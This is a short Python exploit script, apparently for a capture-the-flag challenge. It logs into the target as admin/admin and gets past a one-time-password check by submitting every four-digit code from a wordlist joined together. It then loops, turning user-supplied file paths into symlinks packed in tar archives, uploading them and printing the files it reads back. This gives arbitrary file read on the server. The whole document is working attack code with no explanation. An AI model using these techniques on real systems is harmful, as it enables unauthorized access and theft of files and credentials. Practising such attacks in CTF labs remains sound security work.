import requests
import os
import tarfile
import random
S = requests.Session()
url = "http://a8f1096c8f590772f33a9.playat.flagyard.com"

def bypass_otp():
    S.post(url+"/login", data={"username": "admin", "password": "admin"}, allow_redirects=True)
    S.get(url+"/otp", allow_redirects=True)
    S.post(url+"/otp", data={"otp": get_otp()}, allow_redirects=True)
    return S.get(url+"/", allow_redirects=True).text

def get_otp():
    wholedigits = ""
    wordlist = "./4-digit.txt"
    with open(wordlist) as f:
        digits = f.readlines()
    for d in digits:
        wholedigits += d.strip()
    return wholedigits

def create_symlink_and_tar(filename, link_name="link.file", tar_name="random.tar"):
    os.symlink(filename, link_name)

    # Create a tar file containing the symlink
    with tarfile.open(tar_name, "w") as tar:
        tar.add(link_name)

    print(f"Created symlink: {link_name} -> {filename}")
    print(f"Archived symlink in: {tar_name}")
    full_path = os.path.abspath(tar_name)
    return full_path,link_name

def main():
    bypass_otp()
    while True:
        user_input = input("read file: ")
        link_name = "link.file"+str(random.randint(0,100))
        tar_name = "random"+str(random.randint(0,100))+".tar"
        full_path,link_name = create_symlink_and_tar(user_input, link_name, tar_name)
        S.post(url+"/", files={"file": open(full_path, "rb")}, allow_redirects=True)
        print(S.get(f"{url}/uploads/{link_name}", allow_redirects=True).text)




if __name__ == "__main__":
    main()